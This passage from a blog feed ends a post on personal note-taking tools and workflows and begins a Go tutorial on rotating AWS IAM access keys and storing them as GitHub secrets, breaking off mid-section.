<p>In the application itself (as shown in the video) you can export your mind map to a XML file which can be converted to <a href="/tags/org">ORG</a> using this small <a href="/tags/golang">Golang</a> utility:</p>
<script type="application/javascript" src="https://gist.github.com/dorneanu/906facb9aa2eb88c51dd348cdeaddf97.js?file=main.go"></script>

<p>Once you have download all files included in the gist you can run it against your miMind XML file. In my case I had this XML:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">â¯ head ErnÃ¤hrungskompass.xml
&lt;Root&gt;
&lt;Header <span style="color:#40ffff">info</span>=<span style="color:#ed9d13">&#34;Created with miMind software.&#34;</span>&gt;&lt;/Header&gt;
&lt;Content&gt;
&lt;Node <span style="color:#40ffff">Title</span>=<span style="color:#ed9d13">&#34;ErnÃ¤hrungskompass&#34;</span>&gt;
&lt;Node <span style="color:#40ffff">Title</span>=<span style="color:#ed9d13">&#34;Kapitel 1&#34;</span>&gt;
&lt;Node <span style="color:#40ffff">Title</span>=<span style="color:#ed9d13">&#34;Der Eiweisseffekt&#34;</span>&gt;
&lt;Node <span style="color:#40ffff">Title</span>=<span style="color:#ed9d13">&#34;Tiere sind auf Proteinsuche bis sie ihren Proteinbedarf gedeckt haben&#34;</span>&gt;&lt;/Node&gt;
&lt;Node <span style="color:#40ffff">Title</span>=<span style="color:#ed9d13">&#34;Zu viele Proteine sind auch nicht gut, da sie den Alterungsprozess begÃ¼nstigen&#34;</span>&gt;&lt;/Node&gt;
&lt;/Node&gt;
&lt;Node <span style="color:#40ffff">Title</span>=<span style="color:#ed9d13">&#34;Insektenforscher&#34;</span>&gt;
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ go run main.go -hl <span style="color:#3677a9">1</span> -f ErnÃ¤hrungskompass.xml | head
...
</code></pre></div><h3 id="desktop">Desktop</h3>
<p><a href="https://brainfck.org/#GTD"> GTD</a> suggests to always <a href="https://brainfck.org/#GTD/Input"> capture</a> what has our attention. Also minizing the number of possible capture locations makes your life even easier. But I also tend to capture my thoughts where it feels most comfortable. If I&rsquo;m doing some work at my laptop and suddenly some idea comes to my mind, then I&rsquo;ll capture it on my laptop. In that case I won&rsquo;t grab a piece of paper, put a label on it (to remember what the thought was about) and then put it aside. I&rsquo;d rather use tools on my desktop system.</p>
<p>During the last months 2 <strong>input capture systems</strong> established and have become part of my note capture routine:</p>
<ul>
<li><a href="https://orgmode.org/manual/Capture.html">ORG Capture</a>
<ul>
<li>Intergrated within Emacs and ORG mode</li>
<li>I use it mainly for events, appointments or TODOs</li>
<li>I&rsquo;m not using it anymore for storing thoughts, bookmarks, ideas since I&rsquo;ve moved back to Tiddlywiki</li>
</ul>
</li>
<li><a href="https://brainfck.org/#Tiddlywiki"> Tiddlywiki</a>
<ul>
<li>I always have a running (nodeJS) instance in my browser (<a href="https://brainfck.org">here you can view the exported version</a>)</li>
<li>Whenever I think something should be added to an existing note, I open that tab, search for that specific <strong>tiddler</strong> (a page/note in the Tiddlywiki ecosystem) and make the changes</li>
<li>I also used for storing notes to podcasts, articles I listen/read to/about during the day</li>
</ul>
</li>
</ul>
<figure><img src="/posts/img/2021/note-taking/note-taking-journal.jpg"
         alt="Figure 9: Whenever I work at my laptop and think I need to write sth down, bookmark a site, I use Tiddlywiki&amp;rsquo;s journals to do so (link to that specific journal: 2021-12-03)"/><figcaption>
            <p>Figure 9: Whenever I work at my laptop and think I need to write sth down, bookmark a site, I use Tiddlywiki&rsquo;s journals to do so (link to that specific journal: <a href="https://brainfck.org/#2021-12-03">2021-12-03</a>)</p>
        </figcaption>
</figure>

<figure><img src="/posts/img/2021/note-taking/note-taking-list-of-journals.jpg"
         alt="Figure 10: Here is a list of some Journal entries"/><figcaption>
            <p>Figure 10: Here is a list of some <a href="https://brainfck.org/#Journal"> Journal</a> entries</p>
        </figcaption>
</figure>

<h2 id="note-storage">Note storage</h2>
<p>Contrary to what <a href="https://en.wikipedia.org/wiki/Niklas%5FLuhmann">Niklas Luhmann</a> was doing with his &ldquo;slip box&rdquo; (german: Zettelkasten) I like to have my notes stored digitally. Not only I can easily make multiple
backups and store them at different locations, but I can also apply batch operations (text modification, add/remove tags etc.) using command line tools like <code>sed</code>, <code>awk</code> &amp; co. And as with the <a href="https://brainfck.org/#Unix"> Unix</a> philosophy <a href="https://en.wikipedia.org/wiki/Everything%5Fis%5Fa%5Ffile">everything is a file</a> I like to cluster notes (on the same topic) in one single file. This solution is completely software agnostic and files can be modified accordingly to be imported into different note-taking systems.</p>
<h3 id="requirements">Requirements</h3>
<p>I wrote this post in order to give you some ideas what worked best for <em>me</em> but it&rsquo;s up to you to define which requirements you need for a simple, working solution. For me these
requirements were <em>essential</em>:</p>
<ul>
<li><strong>digital solution</strong>
<ul>
<li>like I&rsquo;ve mentioned before I do think digital solutions are the better long-term storage systems</li>
<li>you can easily backup them</li>
<li>you can share between multiple devices</li>
<li>you can have version control in-place</li>
</ul>
</li>
<li><strong>edit from (almost) everywhere</strong>
<ul>
<li>well in theory you should be able to view, modify your notes regardless of the device:
<ul>
<li>desktop system</li>
<li>smartphone</li>
<li>terminal</li>
<li>web client</li>
</ul>
</li>
<li>I also like to add/modify notes on the fly</li>
</ul>
</li>
<li><strong>good looking UI</strong>
<ul>
<li>Being a &ldquo;terminal guy&rdquo; for many, many years now I didn&rsquo;t thought I would put this as a requirement</li>
<li>However, once you can actually &ldquo;visualize&rdquo; your content or more important see the connections between your notes, you&rsquo;ll definitely start to appreciate <strong>UI</strong></li>
<li>Adding new content or modifying existing one shouldn&rsquo;t be a rocket science</li>
</ul>
</li>
<li><strong>export content</strong>
<ul>
<li>solution has to be <em>software agnostic</em></li>
<li>Imagine in 20 years you&rsquo;ll have to import your notes into some fancy, AI-driven, blockchain-based note system :)</li>
<li>You should be able to do this without massive data manipulation</li>
<li>You should be able to export <strong>all</strong> content to a common format (who knows if JSON will still be around in 20 years)
<ul>
<li>no proprietary format!</li>
</ul>
</li>
<li>If you use tags and extra fields for your content, then it should be easy to use them in the new system</li>
<li>You should export all content to a readable form and share it online (like a <em>digital garden</em>)</li>
</ul>
</li>
</ul>
<h3 id="other-digital-solutions">Other digital solutions</h3>
<ul>
<li><a href="https://agenda.com/">Agenda</a>
<ul>
<li>date focused note taking</li>
</ul>
</li>
<li><a href="https://bear.app/">Bear</a>
<ul>
<li>only for Apple devices</li>
</ul>
</li>
<li><a href="https://www.craft.do/">Craft</a>
<ul>
<li>only for Apple devices</li>
</ul>
</li>
<li><a href="https://www.zengobi.com/curio/">Curio</a></li>
<li><a href="https://evernote.com/">Evernote</a></li>
<li><a href="https://github.com/foambubble/foam">foam</a>
<ul>
<li>personal knowledge management and sharing system for VSCode</li>
</ul>
</li>
<li><a href="https://keep.google.com/">Google Keep</a>
<ul>
<li>I also use it for cooking recipies</li>
<li>has tags</li>
<li>I can easily search in the mobile application</li>
<li>Inserting new notes is very easy</li>
</ul>
</li>
<li><a href="https://www.instanote.io/">instanote</a>
<ul>
<li>for Apple devices only</li>
</ul>
</li>
<li><a href="https://joplinapp.org/">Joplin</a>
<ul>
<li>cross-platform</li>
<li>has encryption</li>
<li><a href="https://mrkaran.dev/posts/how-i-take-notes/">How I take notes</a></li>
</ul>
</li>
<li><a href="https://logseq.com/">logseq</a>
<ul>
<li>supports Markdown and ORG-mode files</li>
<li>very similar to Roam</li>
<li>still in beta though</li>
</ul>
</li>
<li><a href="https://apps.nextcloud.com/apps/notes">Nextcloud/Notes</a>
<ul>
<li>chronically underrated</li>
<li>has sync already built-in</li>
</ul>
</li>
<li><a href="https://notable.app/">Noteable.app</a>
<ul>
<li>available for different platforms</li>
<li>notes are written in Markdown</li>
<li><a href="https://github.com/alok/notational-fzf-vim">notational-fzf</a>
<ul>
<li>works fine with Noteable</li>
<li>Notational velocity for VIM</li>
</ul>
</li>
</ul>
</li>
<li><a href="https://noteplan.co/">NotePlan</a></li>
<li><a href="https://obsidian.md/">Obsidian</a>
<ul>
<li>uses Markdown</li>
<li>maintaines an index for linking things</li>
</ul>
</li>
<li><a href="https://www.microsoft.com/en-us/microsoft-365/onenote/digital-note-taking-app">OneNote</a></li>
<li><a href="https://orgmode.org/">ORG Mode</a>
<ul>
<li>requires Emacs</li>
<li><a href="https://organice.200ok.ch/">organice</a>
<ul>
<li>implementation of ORG mode without Emacs</li>
<li>built for mobile and desktop browsers</li>
</ul>
</li>
<li><a href="https://www.mtsolitary.com/20210309194647-my-org-mode-setup/">My ORG Mode setup</a></li>
</ul>
</li>
<li><a href="https://roamresearch.com/">Roam Research</a>
<ul>
<li>also check <a href="https://joekroese.github.io/tiddlyroam/">TiddlyRoam</a></li>
<li><a href="https://giffmex.org/stroll/stroll.html">Stroll</a> is also amazing</li>
<li>if you want an awesome interface have a look at <a href="https://kebifurai.github.io/TiddlyResearch/">TiddlyResearch</a></li>
</ul>
</li>
<li><a href="https://www.sparkleshare.org/">SparkleShare</a>
<ul>
<li>for sharing documents/folders</li>
</ul>
</li>
<li><a href="https://supernotes.app/">supernotes</a>
<ul>
<li>has an API</li>
<li>uses notecards (similar to tiddlers) for storing content</li>
</ul>
</li>
<li><a href="https://zettelkasten.de/the-archive/">The-Archive</a>
<ul>
<li>built with Zettelkasten philosophy in mind</li>
<li>also check the <a href="https://zettelkasten.de/posts/overview/">Zettelkasten introduction</a> which is really great</li>
</ul>
</li>
<li><a href="https://github.com/vimwiki/vimwiki">vimwiki</a>
<ul>
<li>personal wiki for VIM users</li>
</ul>
</li>
<li><a href="https://zim-wiki.org/">Zim Wiki</a>
<ul>
<li>missing mobile support</li>
</ul>
</li>
</ul>
<h2 id="final-thoughts">Final thoughts</h2>
<p>I really recommend taking this whole topic more seriously since it will pay off on many layers. Not only you&rsquo;ll be able to deep-dive into multiple topics at once, but you&rsquo;ll have a solid
collection of notes/thoughts for later. Having a solid note eco-system will definitely increase your productivity and overall focus since we already spend to much time <em>googling</em> stuff.
<strong>Use your brain for what it was built for</strong>: Thinking, cognitive processes and creativity. Definitely not for storing information.</p>
]]></content:encoded>
    </item>
    
    <item>
      <title>Implement an access key rotator</title>
      <link>https://blog.dornea.nu/2021/04/25/implement-an-access-key-rotator/</link>
      <pubDate>Sun, 25 Apr 2021 00:00:00 +0200</pubDate>
      
      <guid>https://blog.dornea.nu/2021/04/25/implement-an-access-key-rotator/</guid>
      <content:encoded><![CDATA[<h2 id="introduction">Introduction</h2>
<p>With the recent success of <a href="https://docs.github.com/en/actions/learn-github-actions">Github actions</a> you can automate lots of things whenever something in your repos changes, e.g. automatically generate static HTML content (using <a href="/tags/hugo">hugo</a>) and push it to some repository for which GitHub Pages has been configured. Check this <a href="https://github.com/sdras/awesome-actions">awesome actions</a> list for more use cases.</p>
<p>Using <a href="https://docs.github.com/en/actions/reference/encrypted-secrets">encrypted secrets</a> defined either per repository or organization, you can bring your Github workflow to the next level: Authenticate against APIs, login to different services while keeping your secrets/credentials away from your repositories. As a general you should <strong>never</strong> store credentials in your repositories, even
if they&rsquo;re private. Misconfigurations happen all the time and private repos can become public ones without further notice.</p>
<p>In this post I want to show the <a href="/tags/golang">Golang</a> way how to update Github <strong>secrets</strong> in some repository. These secrets (more concrete an <code>AWS IAM access key ID</code> and an <code>AWS IAM access secret key</code>) should be used to interact with <a href="/tags/aws">AWS</a>. Rotating these keys regularly is essential and also part of the <a href="https://docs.aws.amazon.com/general/latest/gr/aws-access-keys-best-practices.html">AWS access keys best practices</a>.</p>



<blockquote class="notice info">
  Make sure you also check <a href="https://github.com/dorneanu/access-key-rotator">github.com/dorneanu/access-key-rotator</a> for the complete project.
</blockquote>

<h2 id="clean-architecture">Clean architecture</h2>
<p>I&rsquo;m obsessed with clean code, clean architecture and almost everything that has an easy to understand structure.
First of all I&rsquo;ll start with the <code>use cases</code> which describe what the application is capabable of doing. In our case we have</p>
<ul>
<li>Rotate keys
<ul>
<li>Given a <code>key manager</code> the existing access keys will be rotated</li>
</ul>
</li>
<li>Upload secrets
<ul>
<li>using a <code>secrets store</code> we&rsquo;ll upload the <strong>encrypted</strong> access key to some storage for later usage</li>
</ul>
</li>
</ul>
<p>The <code>KeyManager</code> and the <code>SecretsStore</code> are interfaces to be implemented by different service providers. What the both have in common is the
<code>AccessKey</code> data structure which holds everything we need to know about an access key.</p>
<figure><img src="/posts/img/2021/key-rotator-interfavces-entities.png"
         alt="Figure 1: Interfaces using entities"/><figcaption>
            <p>Figure 1: Interfaces using entities</p>
        </figcaption>
</figure>

<p>Now that we have defined the general application design, let&rsquo;s go more into details and see which components have to implement the declared interfaces:</p>
<ul>
<li><code>KeyManager</code>
<ul>
<li>a key manager is something that holds/stores your access keys and provides functionalities (CRUD: create, read, update, delete) in order to manage those</li>
<li>examples: AWS IAM, Google Cloud IAM, Azure IAM</li>
</ul>
</li>
<li><code>SecretsStore</code>
<ul>
<li>something that stores your access keys in a secure manner</li>
<li>examples: GitHub Secrets, Gitlab Secrets, LastPass</li>
</ul>
</li>
<li><code>ConfigStore</code>
<ul>
<li>something related to a parameter store</li>
<li>examples: AWS SecretsManager, Google Cloud Secret Manager</li>
</ul>
</li>
</ul>
<p>Each of these components (using 3rd-party libraries etc.) will need to implement the correspondig interface.</p>
<figure><img src="/posts/img/2021/key-rotator.png"
         alt="Figure 2: Components implementing interfaces"/><figcaption>
            <p>Figure 2: Components implementing interfaces</p>
        </figcaption>
</figure>

<h2 id="aws-golang-sdk-v2">AWS Golang SDK v2</h2>
<p>I&rsquo;ll be using the latest Golang SDK which is <a href="https://github.com/aws/aws-sdk-go-v2">v2</a>. In order to manage the <a href="https://aws.github.io/aws-sdk-go-v2/docs/code-examples/iam/">IAM access</a> keys we&rsquo;re going to need these endpoints:</p>
<ul>
<li>list all available access keys using <a href="https://aws.github.io/aws-sdk-go-v2/docs/code-examples/iam/listaccesskeys/">ListAccessKeysV2</a></li>
<li>generate new IAM access key using <a href="https://aws.github.io/aws-sdk-go-v2/docs/code-examples/iam/createaccesskey/">CreateAccessKeyv2</a></li>
<li>delete old access keys using <a href="https://aws.github.io/aws-sdk-go-v2/docs/code-examples/iam/deleteaccesskey/">DeleteAccessKeyv2</a></li>
</ul>
<p>In order the make the code more <strong>testable</strong> I&rsquo;ll be using an <strong>interface</strong> called <code>IAMAPI</code> which should contain all methods an IAM API real implementation
should provide. Generating mocks should be then also an easy task as described in <a href="https://aws.github.io/aws-sdk-go-v2/docs/unit-testing/">Unit Testing with the AWS SDK for Go V2</a>.</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#6ab825;font-weight:bold">type</span> IAMAPI <span style="color:#6ab825;font-weight:bold">interface</span> {
	<span style="color:#447fcf">ListAccessKeys</span>() ...
	<span style="color:#447fcf">CreateAccessKey</span>() ...
	<span style="color:#447fcf">DeleteAccessKey</span>() ...
}
</code></pre></div><p>Additionally I&rsquo;ll use an own <code>Configuration</code> type meant to hold all information my applications needs. I find <a href="https://github.com/kelseyhightower/envconfig">github.com/kelseyhightower/envconfig</a> to be quite
handy when you have to deal with <strong>environment</strong> variables:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#999;font-style:italic">// Config holds all relevant information for this application to run
</span><span style="color:#999;font-style:italic"></span><span style="color:#6ab825;font-weight:bold">type</span> Config <span style="color:#6ab825;font-weight:bold">struct</span> {
	IAM_User   <span style="color:#6ab825;font-weight:bold">string</span> <span style="color:#ed9d13">`envconfig:&#34;IAM_USER&#34;, required:&#34;true&#34;`</span>
	AWS_REGION <span style="color:#6ab825;font-weight:bold">string</span> <span style="color:#ed9d13">`envconfig:&#34;AWS_REGION&#34; required:&#34;true&#34;`</span>
	...
}
</code></pre></div><h3 id="list-fetch-all-available-iam-keys">List/Fetch all available IAM keys</h3>
<p>First of all let&rsquo;s list all available IAM access keys.</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#6ab825;font-weight:bold">package</span> main

<span style="color:#6ab825;font-weight:bold">import</span> (
	<span style="color:#ed9d13">&#34;context&#34;</span>
	<span style="color:#ed9d13">&#34;fmt&#34;</span>
	<span style="color:#ed9d13">&#34;log&#34;</span>

	<span style="color:#ed9d13">&#34;github.com/aws/aws-sdk-go-v2/aws&#34;</span>
	<span style="color:#ed9d13">&#34;github.com/aws/aws-sdk-go-v2/config&#34;</span>
	<span style="color:#ed9d13">&#34;github.com/aws/aws-sdk-go-v2/service/iam&#34;</span>
	<span style="color:#ed9d13">&#34;github.com/kelseyhightower/envconfig&#34;</span>
)

<span style="color:#999;font-style:italic">// Config holds all relevant information for this application to run
</span><span style="color:#999;font-style:italic"></span><span style="color:#6ab825;font-weight:bold">type</span> Config <span style="color:#6ab825;font-weight:bold">struct</span> {
	IAM_User   <span style="color:#6ab825;font-weight:bold">string</span> <span style="color:#ed9d13">`envconfig:&#34;IAM_USER&#34;, required:&#34;true&#34;`</span>
	AWS_REGION <span style="color:#6ab825;font-weight:bold">string</span> <span style="color:#ed9d13">`envconfig:&#34;AWS_REGION&#34; required:&#34;true&#34;`</span>
}

<span style="color:#999;font-style:italic">// We&#39;ll define an interface fot the IAM API in order to make testing easy
</span><span style="color:#999;font-style:italic">// This interface will be extended as we go through the different steps
</span><span style="color:#999;font-style:italic"></span><span style="color:#6ab825;font-weight:bold">type</span> IAMAPI <span style="color:#6ab825;font-weight:bold">interface</span> {
	<span style="color:#447fcf">ListAccessKeys</span>(ctx context.Context, params *iam.ListAccessKeysInput, optFns ...<span style="color:#6ab825;font-weight:bold">func</span>(*iam.Options)) (*iam.ListAccessKeysOutput, <span style="color:#6ab825;font-weight:bold">error</span>)
}

<span style="color:#999;font-style:italic">// ListAccessKeys retrieves the IAM access keys for an user
</span><span style="color:#999;font-style:italic"></span><span style="color:#6ab825;font-weight:bold">func</span> <span style="color:#447fcf">ListAccessKeys</span>(c context.Context, api IAMAPI, username <span style="color:#6ab825;font-weight:bold">string</span>) (*iam.ListAccessKeysOutput, <span style="color:#6ab825;font-weight:bold">error</span>) {
	input := &amp;iam.ListAccessKeysInput{
		MaxItems: aws.<span style="color:#447fcf">Int32</span>(<span style="color:#24909d">int32</span>(<span style="color:#3677a9">10</span>)),
		UserName: &amp;username,
	}
	<span style="color:#6ab825;font-weight:bold">return</span> api.<span style="color:#447fcf">ListAccessKeys</span>(c, input)
}

<span style="color:#999;font-style:italic">// loadConfig will return an instance of Config
</span><span style="color:#999;font-style:italic"></span><span style="color:#6ab825;font-weight:bold">func</span> <span style="color:#447fcf">loadConfig</span>() *Config {
	<span style="color:#6ab825;font-weight:bold">var</span> c Config
	err := envconfig.<span style="color:#447fcf">Process</span>(<span style="color:#ed9d13">&#34;&#34;</span>, &amp;c)
	<span style="color:#6ab825;font-weight:bold">if</span> err != <span style="color:#6ab825;font-weight:bold">nil</span> {
		log.<span style="color:#447fcf">Fatal</span>(err.<span style="color:#447fcf">Error</span>())
	}
	<span style="color:#6ab825;font-weight:bold">return</span> &amp;c
}

<span style="color:#6ab825;font-weight:bold">func</span> <span style="color:#447fcf">main</span>() {
	<span style="color:#999;font-style:italic">// Get configuration
</span><span style="color:#999;font-style:italic"></span>	c := <span style="color:#447fcf">loadConfig</span>()

	<span style="color:#999;font-style:italic">// Initialize AWS
</span><span style="color:#999;font-style:italic"></span>	cfg, err := config.<span style="color:#447fcf">LoadDefaultConfig</span>(context.<span style="color:#447fcf">TODO</span>())
	<span style="color:#6ab825;font-weight:bold">if</span> err != <span style="color:#6ab825;font-weight:bold">nil</span> {
		<span style="color:#24909d">panic</span>(<span style="color:#ed9d13">&#34;configuration error, &#34;</span> + err.<span style="color:#447fcf">Error</span>())
	}

	<span style="color:#999;font-style:italic">// Create new IAM client
</span><span style="color:#999;font-style:italic"></span>	iam_client := iam.<span style="color:#447fcf">NewFromConfig</span>(cfg)
	result, err := <span style="color:#447fcf">ListAccessKeys</span>(context.<span style="color:#447fcf">TODO</span>(), iam_client, c.IAM_User)
	<span style="color:#6ab825;font-weight:bold">if</span> err != <span style="color:#6ab825;font-weight:bold">nil</span> {
		fmt.<span style="color:#447fcf">Println</span>(<span style="color:#ed9d13">&#34;Got an error retrieving user access keys:&#34;</span>)
		fmt.<span style="color:#447fcf">Println</span>(err)
		<span style="color:#6ab825;font-weight:bold">return</span>
	}

	<span style="color:#999;font-style:italic">// Print available IAM access keys
</span><span style="color:#999;font-style:italic"></span>	<span style="color:#6ab825;font-weight:bold">for</span> _, key := <span style="color:#6ab825;font-weight:bold">range</span> result.AccessKeyMetadata {
		fmt.<span style="color:#447fcf">Println</span>(<span style="color:#ed9d13">&#34;Status for access key &#34;</span> + *key.AccessKeyId + <span style="color:#ed9d13">&#34;: &#34;</span> + <span style="color:#24909d">string</span>(key.Status))
	}
}
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">Status for access key AKIAWSIW5AN47M5YY72J: Active
</code></pre></div><p>As you can see there is an IAM access key with the ID <code>AKIAWSIW5AN47M5YY72J</code> and it&rsquo;s active.</p>
<h3 id="generate-new-iam-access-key">Generate new IAM access key</h3>
<p>In the next step we&rsquo;ll generate a new pair of access key. Therefore we&rsquo;ll extend the <code>IAMAPI</code> interface with a 2nd method:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#6ab825;font-weight:bold">type</span> IAMAPI <span style="color:#6ab825;font-weight:bold">interface</span> {
	<span style="color:#447fcf">ListAccessKeys</span>(ctx context.Context, params *iam.ListAccessKeysInput, optFns ...<span style="color:#6ab825;font-weight:bold">func</span>(*iam.Options)) (*iam.ListAccessKeysOutput, <span style="color:#6ab825;font-weight:bold">error</span>)
	<span style="color:#447fcf">CreateAccessKey</span>(ctx context.Context, params *iam.CreateAccessKeyInput, optFns ...<span style="color:#6ab825;font-weight:bold">func</span>(*iam.Options)) (*iam.CreateAccessKeyOutput, <span style="color:#6ab825;font-weight:bold">error</span>)
}
</code></pre></div><p>Creating a new key pair should also be straght forwards:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#999;font-style:italic">// CreateAccessKey will create a new IAM access key for a specified user
</span><span style="color:#999;font-style:italic"></span><span style="color:#6ab825;font-weight:bold">func</span> <span style="color:#447fcf">CreateAccessKey</span>(c context.Context, api IAMAPI, username <span style="color:#6ab825;font-weight:bold">string</span>) (*iam.CreateAccessKeyOutput, <span style="color:#6ab825;font-weight:bold">error</span>) {
	input := &amp;iam.CreateAccessKeyInput{
		UserName: &amp;username,
	}
	<span style="color:#6ab825;font-weight:bold">return</span> api.<span style="color:#447fcf">CreateAccessKey</span>(c, input)
}
</code></pre></div><p>And then in the <code>main()</code> we add:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go">	<span style="color:#999;font-style:italic">// Create new IAM access key
</span><span style="color:#999;font-style:italic"></span>	new_key, err := <span style="color:#447fcf">CreateAccessKey</span>(context.<span style="color:#447fcf">TODO</span>(), iam_client, c.IAM_User)
	<span style="color:#6ab825;font-weight:bold">if</span> err != <span style="color:#6ab825;font-weight:bold">nil</span> {
		fmt.<span style="color:#447fcf">Println</span>(<span style="color:#ed9d13">&#34;Couldn&#39;t create new key: &#34;</span> + err.<span style="color:#447fcf">Error</span>())
		<span style="color:#6ab825;font-weight:bold">return</span>
	}

	<span style="color:#999;font-style:italic">// Print new key
</span><span style="color:#999;font-style:italic"></span>	fmt.<span style="color:#447fcf">Println</span>(<span style="color:#ed9d13">&#34;Created new access key with ID: &#34;</span> + *new_key.AccessKey.AccessKeyId + <span style="color:#ed9d13">&#34; and secret key: &#34;</span> + *new_key.AccessKey.SecretAccessKey)
</code></pre></div><p>And if we run it, we&rsquo;ll get the new key id and the secret key:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">...
Created new access key with ID: AKIAWSIW5AN46DT2ENLL and secret key: ****************************************
</code></pre></div><h3 id="delete-old-access-key">Delete old access key</h3>
<p>We&rsquo;ll extend the <code>IAMAPI</code> interface again:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#6ab825;font-weight:bold">type</span> IAMAPI <span style="color:#6ab825;font-weight:bold">interface</span> {
	<span style="color:#447fcf">ListAccessKeys</span>(ctx context.Context, params *iam.ListAccessKeysInput, optFns ...<span style="color:#6ab825;font-weight:bold">func</span>(*iam.Options)) (*iam.ListAccessKeysOutput, <span style="color:#6ab825;font-weight:bold">error</span>)
	<span style="color:#447fcf">CreateAccessKey</span>(ctx context.Context, params *iam.CreateAccessKeyInput, optFns ...<span style="color:#6ab825;font-weight:bold">func</span>(*iam.Options)) (*iam.CreateAccessKeyOutput, <span style="color:#6ab825;font-weight:bold">error</span>)
	<span style="color:#447fcf">DeleteAccessKey</span>(ctx context.Context, params *iam.DeleteAccessKeyInput, optFns ...<span style="color:#6ab825;font-weight:bold">func</span>(*iam.Options)) (*iam.DeleteAccessKeyOutput, <span style="color:#6ab825;font-weight:bold">error</span>)
}
</code></pre></div><p>The <code>DeleteAccessKey</code> will also need an <code>access key ID</code> and an <code>username</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#999;font-style:italic">// DeleteAccessKey disables and removes an IAM access key
</span><span style="color:#999;font-style:italic"></span><span style="color:#6ab825;font-weight:bold">func</span> <span style="color:#447fcf">DeleteAccessKey</span>(c context.Context, api IAMAPI, keyID, username <span style="color:#6ab825;font-weight:bold">string</span>) (*iam.DeleteAccessKeyOutput, <span style="color:#6ab825;font-weight:bold">error</span>) {
	input := &amp;iam.DeleteAccessKeyInput{
		AccessKeyId: &amp;keyID,
		UserName:    &amp;username,
	}
	<span style="color:#6ab825;font-weight:bold">return</span> api.<span style="color:#447fcf">DeleteAccessKey</span>(c, input)
}
</code></pre></div><p>For this example we&rsquo;ll just delete the previously created IAM access key:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go">	<span style="color:#999;font-style:italic">// Delete key
</span><span style="color:#999;font-style:italic"></span>	_, err = <span style="color:#447fcf">DeleteAccessKey</span>(
		context.<span style="color:#447fcf">TODO</span>(),
		iam_client,
		*new_key.AccessKey.AccessKeyId,
		c.IAM_User,
	)
	<span style="color:#6ab825;font-weight:bold">if</span> err != <span style="color:#6ab825;font-weight:bold">nil</span> {
		fmt.<span style="color:#447fcf">Println</span>(<span style="color:#ed9d13">&#34;Couldn&#39;t delete key: &#34;</span> + err.<span style="color:#447fcf">Error</span>())
		<span style="color:#6ab825;font-weight:bold">return</span>
	}
	fmt.<span style="color:#447fcf">Printf</span>(<span style="color:#ed9d13">&#34;Deleted key: %s\n&#34;</span>, *new_key.AccessKey.AccessKeyId)
</code></pre></div><h2 id="github-setup">Github setup</h2>
<p>The Github implementation will have to satisfy the <code>SecretsStore</code> interface:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-golang" data-lang="golang"><span style="color:#6ab825;font-weight:bold">type</span> SecretsStore <span style="color:#6ab825;font-weight:bold">interface</span> {
	<span style="color:#447fcf">EncryptKey</span>(context.Context, entity.AccessKey) (*entity.EncryptedKey, <span style="color:#6ab825;font-weight:bold">error</span>)
	<span style="color:#447fcf">ListSecrets</span>(context.Context) ([]entity.AccessKey, <span style="color:#6ab825;font-weight:bold">error</span>)
	<span style="color:#447fcf">CreateSecret</span>(context.Context, entity.EncryptedKey) <span style="color:#6ab825;font-weight:bold">error</span>
	<span style="color:#447fcf">DeleteSecret</span>(context.Context, entity.EncryptedKey) <span style="color:#6ab825;font-weight:bold">error</span>
}
</code></pre></div><h3 id="secretsstore-implementation">SecretsStore implementation</h3>
<p>As we have done with <strong>AWS</strong> we&rsquo;ll try to decouple everything and have less cohesion. This will make every part of our code testable.
The <code>GithubSecretsStore</code> (implementing <code>SecretsStore</code>) will look like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-golang" data-lang="golang"><span style="color:#6ab825;font-weight:bold">type</span> GithubSecretsStore <span style="color:#6ab825;font-weight:bold">struct</span> {
	repo_owner    <span style="color:#6ab825;font-weight:bold">string</span>
	repo_name     <span style="color:#6ab825;font-weight:bold">string</span>
	secretsClient GithubSecretsService
}
</code></pre></div><h3 id="make-secrets-service-abstract">Make secrets service abstract</h3>
